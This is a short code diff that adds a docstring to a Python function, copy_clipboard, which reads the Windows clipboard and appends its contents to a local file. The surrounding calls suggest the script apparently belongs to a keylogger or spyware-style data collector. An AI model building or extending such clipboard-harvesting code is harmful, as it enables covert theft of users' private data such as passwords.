@@ -70,6 +70,12 @@ computer_information()
 ''' Get the clipboard contents. '''
 
 def copy_clipboard():
+    """
+    This function copies the clipboard data and writes it to a file.
+    The file is located in the same directory as the script.
+    The file is named clipboard_information.txt
+    The file is appended with the clipboard data.
+    """
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
